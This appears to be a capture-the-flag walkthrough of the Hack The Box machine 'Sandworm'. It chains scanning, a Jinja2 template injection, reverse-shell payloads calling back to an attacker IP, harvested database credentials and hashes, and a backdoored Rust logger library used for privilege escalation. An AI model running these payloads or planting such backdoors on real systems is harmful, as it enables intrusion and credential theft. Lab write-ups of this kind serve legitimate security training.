# #1 Introduction
<img width="692" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/d90f6781-091a-411d-857d-83aac3e84515">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx sandworm.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- sandworm.htb
```

we got these open ports
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)


about                   [Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 211ms]
admin                   [Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 81ms]
contact                 [Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 55ms]
guide                   [Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 73ms]
login                   [Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 78ms]
logout                  [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 71ms]
pgp                     [Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 110ms]
process                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 89ms]
view                    [Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 110ms]


.gpg
.asc
.sig
.key



https://www.wired.co.uk/article/efail-pgp-vulnerability-outlook-thunderbird-smime

https://efail.de/

we can use a ssti (sever side template injection) by using the RealName of the public key generated and verifying signature of message\
by using {{ 7 * 7 }} for example, we can see that the code is executed cause we have a web template engine named jinja2 (in python)\

So to get a reverse shell, we can use this crafted payload:

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('which id').read() }}


rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.56 6666 >/tmp/f \
en base64 \
cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuNTYgNjY2NiA+L3RtcC9mCg== \


{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS41Ni82NjY2IDA+JjEiCg==" | base64 -d | bash').read() }}

we are now atlas\
in app.py file, we found a passphrase : $M1DGu4rD$

in the __init__.py file, we found the sql credentials : \

app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21' \
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'\


to connect to sql since we don't have binaries, we can use python3 and the db module since we now it's available by looking in home/.\

```
drwxrwxr-x 23 atlas atlas  4096 Feb  2  2023 .
drwxrwxr-x  3 atlas atlas  4096 Nov 30  2022 ..
drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 backports
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 configparser-5.3.0.dist-info
-rw-rw-r--  1 atlas atlas  1546 Feb  2  2023 configparser.py
drwxrwxr-x  4 atlas atlas  4096 Feb  2  2023 flask
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 Flask-2.2.2.dist-info
drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 flask_login
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 Flask_Login-0.6.2.dist-info
drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 flask_sqlalchemy
drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 Flask_SQLAlchemy-3.0.3.dist-info
-rw-rw-r--  1 atlas atlas 57134 Nov 30  2022 gnupg.py
drwxrwxr-x  5 atlas atlas  4096 Feb  2  2023 greenlet
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 greenlet-2.0.2.dist-info
drwxrwxr-x  3 atlas atlas  4096 Feb  2  2023 markupsafe
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 MarkupSafe-2.1.2.dist-info
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 mysqlclient-2.1.1.dist-info
drwxrwxr-x  4 atlas atlas  4096 Feb  2  2023 MySQLdb
drwxrwxr-x  2 atlas atlas  4096 May  4  2023 __pycache__
drwxrwxr-x  2 atlas atlas  4096 Nov 30  2022 python_gnupg-0.4.3.dist-info
drwxrwxr-x 15 atlas atlas  4096 Feb  2  2023 sqlalchemy
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 SQLAlchemy-2.0.1.dist-info
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 typing_extensions-4.4.0.dist-info
-rw-rw-r--  1 atlas atlas 80078 Feb  2  2023 typing_extensions.py
drwxrwxr-x  8 atlas atlas  4096 Feb  2  2023 werkzeug
drwxrwxr-x  2 atlas atlas  4096 Feb  2  2023 Werkzeug-2.2.2.dist-info
```

((b'1', b'Odin', b'pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f'),)
((b'2', b'silentobserver', b'pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d'),)


home/atlas/.config/httpie/sessions/localhost_5000/admin.json
silentobserver:quietLiketheWind22





/sbin/init maybe-ubiquity 
2023/11/15 15:12:11 CMD: UID=0     PID=28613  | /bin/bash /root/Cleanup/clean_c.sh 
2023/11/15 15:12:11 CMD: UID=0     PID=28614  | /bin/rm -r /opt/crates 
2023/11/15 15:12:11 CMD: UID=0     PID=28615  | 
2023/11/15 15:12:11 CMD: UID=0     PID=28616  | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
/usr/bin/cargo run --offline 
2023/11/15 15:14:01 CMD: UID=1000  PID=28636  | /usr/bin/cargo run --offline 
2023/11/15 15:14:01 CMD: UID=1000  PID=28638  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg                                                      
2023/11/15 15:14:01 CMD: UID=1000  PID=28640  | /usr/bin/cargo run --offline 
2023/11/15 15:14:11 CMD: UID=0     PID=28645  | /bin/bash /root/Cleanup/clean_c.sh
/bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline



/opt/crates/logger/src/lib.rs is writable


extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    Command::new("bash")
        .arg("-c")  
        .arg("bash -i >& /dev/tcp/10.10.15.56/6666 0>&1")
        .output()
        .expect("failed to execute process");

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justificatio>

    let mut file = match OpenOptions::new().append(true).create(true).o>
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}

